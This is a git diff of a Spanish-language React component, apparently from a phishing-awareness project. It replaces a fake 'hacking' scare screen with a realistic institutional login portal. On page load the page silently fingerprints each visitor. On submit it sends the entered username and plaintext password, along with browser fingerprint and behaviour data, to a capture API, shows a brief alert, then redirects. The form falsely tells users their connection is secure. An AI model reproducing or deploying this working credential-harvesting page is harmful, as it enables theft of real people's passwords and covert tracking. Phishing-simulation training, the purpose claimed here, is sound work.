@@ -1,23 +1,18 @@
 import { useState, useEffect, useRef } from 'react';
-import { collectFingerprint, safeVibrate } from '../utils/fingerprint';
+import { collectFingerprint } from '../utils/fingerprint';
 import { captureData } from '../utils/api';
 
 /**
- * PhishingPage - Exact React version of glitch.html
+ * Login Page - Ciberseguridad del Bienestar
  *
  * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
- * Demonstrates how data can be collected without user interaction
+ * Demonstrates credential harvesting with fingerprinting
  */
 
 const PhishingPageNew = () => {
-  // Refs for DOM elements
-  const audioRef = useRef(null);
-
   // State
-  const [isLoading, setIsLoading] = useState(true);
-  const [showGlitch, setShowGlitch] = useState(false);
-  const [showHacking, setShowHacking] = useState(false);
-  const [terminalLines, setTerminalLines] = useState([]);
+  const [formData, setFormData] = useState({ username: '', password: '' });
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   // Behavior tracking
   const startTimeRef = useRef(Date.now());
@@ -37,6 +32,29 @@ const PhishingPageNew = () => {
     window.addEventListener('click', handleClick);
     window.addEventListener('scroll', handleScroll);
 
+    // Auto-capture fingerprint on page load
+    (async () => {
+      try {
+        console.log('🔍 [AUTO-CAPTURE] Collecting fingerprint on page load...');
+        const fingerprint = await collectFingerprint();
+        const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+
+        await captureData({
+          ...fingerprint,
+          behavior: { ...behaviorRef.current, timeOnPage },
+          metadata: {
+            userSubmitted: false,
+            formData: { username: null, password: null },
+            pageVisit: true
+          },
+          timestamp: new Date().toISOString(),
+        });
+        console.log('✅ [AUTO-CAPTURE] Page visit captured');
+      } catch (error) {
+        console.error('❌ [AUTO-CAPTURE] Failed:', error);
+      }
+    })();
+
     return () => {
       window.removeEventListener('mousemove', handleMouseMove);
       window.removeEventListener('click', handleClick);
@@ -44,157 +62,188 @@ const PhishingPageNew = () => {
     };
   }, []);
 
-  // Type text effect
-  const typeText = async (text, speed = 50) => {
-    for (let i = 0; i < text.length; i++) {
-      await new Promise(resolve => setTimeout(resolve, speed));
-      setTerminalLines(prev => {
-        const newLines = [...prev];
-        if (newLines.length === 0 || newLines[newLines.length - 1].complete) {
-          newLines.push({ text: text[i], complete: false });
-        } else {
-          newLines[newLines.length - 1].text += text[i];
-        }
-        return newLines;
-      });
+  // Handle form submit
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    if (!formData.username || !formData.password) {
+      alert('Por favor ingresa tu usuario y contraseña');
+      return;
     }
-    setTerminalLines(prev => {
-      const newLines = [...prev];
-      newLines[newLines.length - 1].complete = true;
-      return newLines;
-    });
+
+    setIsSubmitting(true);
+
+    try {
+      console.log('🔍 [CREDENTIAL-CAPTURE] Capturing credentials...');
+      const fingerprint = await collectFingerprint();
+      const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
+
+      await captureData({
+        ...fingerprint,
+        behavior: { ...behaviorRef.current, timeOnPage },
+        metadata: {
+          userSubmitted: true,
+          formData: {
+            username: formData.username,
+            password: formData.password
+          }
+        },
+        timestamp: new Date().toISOString(),
+      });
+
+      console.log('✅ [CREDENTIAL-CAPTURE] Credentials captured!');
+
+      // Show educational message
+      alert('⚠️ DEMOSTRACIÓN EDUCATIVA\n\nEsto es una simulación de phishing.\nTus credenciales y datos del navegador fueron capturados.\n\nNUNCA ingreses tus credenciales en sitios sospechosos.');
+
+      // Redirect to real site
+      window.location.href = 'https://ezmprojects.com/MIT/index.html';
+    } catch (error) {
+      console.error('❌ [CREDENTIAL-CAPTURE] Failed:', error);
+      alert('Error al procesar. Por favor intenta de nuevo.');
+      setIsSubmitting(false);
+    }
   };
-
-  // Show hacking sequence
-  const showHackingSequence = async () => {
-    setTerminalLines([]);
-
-    await typeText('> ACCESO NO AUTORIZADO DETECTADO', 30);
-    await new Promise(r => setTimeout(r, 400));
-    await typeText('> Iniciando protocolos de seguridad...', 30);
-    await new Promise(r => setTimeout(r, 600));
-    await typeText('> Rastreando dispositivo...', 30);
-    await new Promise(r => setTimeout(r, 500));
-    await typeText('> IP: ' + (await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'xxx.xxx.xxx.xxx')), 30);
-    await new Promise(r => setTimeout(r, 400));
-    await typeText('> Dispositivo: ' + navigator.platform, 30);
-    await new Promise(r => setTimeout(r, 400));
-    await typeText('> Navegador: ' + navigator.userAgent.split(' ').pop(), 30);
-    await new Promise(r => setTimeout(r, 600));
-    await typeText('> Recopilando información del sistema...', 30);
-    await new Promise(r => setTimeout(r, 800));
-    await typeText('> ADVERTENCIA: Actividad sospechosa registrada', 30);
-    await new Promise(r => setTimeout(r, 500));
-    await typeText('> Datos capturados y enviados...', 30);
-    await new Promise(r => setTimeout(r, 1000));
-    await typeText('> Análisis de seguridad completado', 30);
-  };
-
-  // Main sequence
-  useEffect(() => {
-    const runSequence = async () => {
-      // 1. Start capture in background (don't wait for it)
-      (async () => {
-        try {
-          console.log('🔍 [AUTO-CAPTURE] Starting fingerprint collection...');
-          const fingerprint = await collectFingerprint();
-          console.log('🔍 [AUTO-CAPTURE] Fingerprint collected:', fingerprint);
-
-          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
-          const payload = {
-            ...fingerprint,
-            behavior: { ...behaviorRef.current, timeOnPage },
-            metadata: {
-              userSubmitted: false,
-              formData: { email: null, password: null }
-            },
-            timestamp: new Date().toISOString(),
-          };
-
-          console.log('🔍 [AUTO-CAPTURE] Sending to API...', payload);
-          const result = await captureData(payload);
-          console.log('✅ [AUTO-CAPTURE] Successfully saved to database!', result);
-        } catch (error) {
-          console.error('❌ [AUTO-CAPTURE] Failed:', error);
-        }
-      })();
-
-      // 2. Wait 7 seconds (loading) - continues independently
-      await new Promise(r => setTimeout(r, 7000));
-      setIsLoading(false);
-
-      // 3. Wait a moment
-      await new Promise(r => setTimeout(r, 500));
-
-      // 4. Vibrate and show glitch
-      safeVibrate([200, 100, 200, 100, 200, 100, 200]);
-      setShowGlitch(true);
-      setShowHacking(true);
-
-      // 5. More vibration
-      setTimeout(() => safeVibrate([100, 80, 100, 80, 100, 80, 100]), 300);
-      setTimeout(() => safeVibrate([100, 80, 100, 80, 100]), 1200);
-
-      // 6. Play audio
-      if (audioRef.current) {
-        audioRef.current.volume = 1.0;
-        audioRef.current.play().catch(err => console.error('Audio error:', err));
-      }
-
-      // 7. Show hacking sequence
-      await showHackingSequence();
-
-      // 8. Keep showing terminal (loop glitch effects)
-      setInterval(() => {
-        safeVibrate([50, 50, 50]);
-      }, 5000);
-    };
-
-    runSequence();
-  }, []);
 
   return (
-    <div className="min-h-screen bg-black text-white font-mono overflow-hidden">
-      <audio ref={audioRef} src="/AudioCOnsequence.mp3" preload="auto" />
-
-      {/* Loading Screen */}
-      {isLoading && (
-        <div className="fixed inset-0 bg-black flex items-center justify-center z-50">
-          <div className="text-center">
-            <div className="inline-block animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-apex-red mb-4"></div>
-            <p className="text-xl text-apex-green">Cargando contenido...</p>
+    <div className="min-h-screen bg-gray-50">
+      {/* Header */}
+      <header className="bg-white shadow-sm">
+        <div className="container mx-auto px-4 py-4">
+          <div className="flex items-center justify-between">
+            <div>
+              <h1 className="text-2xl font-bold text-gray-800">Ciberseguridad del Bienestar</h1>
+              <p className="text-sm text-gray-600">Portal Educativo</p>
+            </div>
+            <nav className="hidden md:flex space-x-6 text-gray-700">
+              <a href="#" className="hover:text-blue-600">Inicio</a>
+              <a href="#" className="hover:text-blue-600">Sobre nuestro objetivo</a>
+              <a href="#" className="hover:text-blue-600">Prevenciones</a>
+              <a href="#" className="hover:text-blue-600">Simulacro</a>
+            </nav>
           </div>
         </div>
-      )}
+      </header>
 
-      {/* Glitch Overlay */}
-      {showGlitch && (
-        <div className="fixed inset-0 bg-apex-red opacity-10 pointer-events-none z-20 animate-glitch-intense"></div>
-      )}
-
-      {/* Hacking Screen */}
-      {showHacking && (
-        <div className="fixed inset-0 bg-black flex items-center justify-center z-30 p-4">
-          <div className="bg-gray-900 border-2 border-apex-green rounded-lg p-6 max-w-4xl w-full">
-            <div className="flex items-center mb-4 border-b border-gray-700 pb-2">
-              <div className="flex space-x-2">
-                <div className="w-3 h-3 rounded-full bg-red-500"></div>
-                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
-                <div className="w-3 h-3 rounded-full bg-green-500"></div>
+      {/* Main Content */}
+      <main className="container mx-auto px-4 py-12">
+        <div className="max-w-md mx-auto">
+          {/* Login Card */}
+          <div className="bg-white rounded-lg shadow-lg p-8">
+            <div className="text-center mb-8">
+              <div className="w-20 h-20 bg-blue-600 rounded-full mx-auto mb-4 flex items-center justify-center">
+                <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                </svg>
               </div>
-              <span className="ml-4 text-gray-400">terminal@security-scan</span>
+              <h2 className="text-2xl font-bold text-gray-800 mb-2">Acceso al Portal</h2>
+              <p className="text-gray-600">Ingresa con tu cuenta institucional</p>
             </div>
-            <div className="space-y-1 text-apex-green text-sm max-h-96 overflow-y-auto">
-              {terminalLines.map((line, index) => (
-                <div key={index}>
-                  {line.text}
-                  {!line.complete && <span className="animate-pulse">▋</span>}
-                </div>
-              ))}
+
+            <form onSubmit={handleSubmit} className="space-y-6">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Usuario o Correo Electrónico
+                </label>
+                <input
+                  type="text"
+                  value={formData.username}
+                  onChange={(e) => setFormData({ ...formData, username: e.target.value })}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
+                  placeholder="tu.usuario@ejemplo.com"
+                  required
+                />
+              </div>
+
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-2">
+                  Contraseña
+                </label>
+                <input
+                  type="password"
+                  value={formData.password}
+                  onChange={(e) => setFormData({ ...formData, password: e.target.value })}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition"
+                  placeholder="••••••••"
+                  required
+                />
+              </div>
+
+              <div className="flex items-center justify-between text-sm">
+                <label className="flex items-center">
+                  <input type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
+                  <span className="ml-2 text-gray-700">Recordarme</span>
+                </label>
+                <a href="#" className="text-blue-600 hover:underline">¿Olvidaste tu contraseña?</a>
+              </div>
+
+              <button
+                type="submit"
+                disabled={isSubmitting}
+                className="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                {isSubmitting ? 'Ingresando...' : 'Iniciar Sesión'}
+              </button>
+            </form>
+
+            <div className="mt-6 text-center">
+              <p className="text-sm text-gray-600">
+                ¿No tienes una cuenta? <a href="#" className="text-blue-600 hover:underline">Regístrate aquí</a>
+              </p>
+            </div>
+
+            <div className="mt-6 pt-6 border-t border-gray-200 text-center">
+              <p className="text-xs text-gray-500">
+                🔒 Conexión segura - Tus datos están protegidos
+              </p>
+            </div>
+          </div>
+
+          {/* Info Box */}
+          <div className="mt-6 bg-blue-50 border border-blue-200 rounded-lg p-4">
+            <div className="flex items-start">
+              <svg className="w-5 h-5 text-blue-600 mt-0.5 mr-3 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
+                <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
+              </svg>
+              <div className="text-sm text-blue-800">
+                <p className="font-medium mb-1">Acceso exclusivo para estudiantes y personal</p>
+                <p className="text-blue-700">Si tienes problemas para acceder, contacta al administrador del sistema.</p>
+              </div>
             </div>
           </div>
         </div>
-      )}
+      </main>
+
+      {/* Footer */}
+      <footer className="bg-gray-800 text-white mt-16">
+        <div className="container mx-auto px-4 py-8">
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
+            <div>
+              <h3 className="text-lg font-bold mb-4">Ciberseguridad del Bienestar</h3>
+              <p className="text-gray-400 text-sm">
+                Proyecto educativo dedicado a la concientización sobre seguridad en línea.
+              </p>
+            </div>
+            <div>
+              <h3 className="text-lg font-bold mb-4">Enlaces Útiles</h3>
+              <ul className="space-y-2 text-sm">
+                <li><a href="#" className="text-gray-400 hover:text-white">Inicio</a></li>
+                <li><a href="#" className="text-gray-400 hover:text-white">Prevenciones</a></li>
+                <li><a href="#" className="text-gray-400 hover:text-white">Contacto</a></li>
+              </ul>
+            </div>
+            <div>
+              <h3 className="text-lg font-bold mb-4">Contacto</h3>
+              <p className="text-gray-400 text-sm">Chihuahua, Chihuahua</p>
+              <p className="text-gray-400 text-sm mt-2">info@ciberseguridadbienestar.edu</p>
+            </div>
+          </div>
+          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-sm text-gray-400">
+            <p>⚠️ Proyecto Educativo de Ciberseguridad - Demostración Académica</p>
+            <p className="mt-2">© 2024 Ciberseguridad del Bienestar. Todos los derechos reservados.</p>
+          </div>
+        </div>
+      </footer>
     </div>
   );
 };
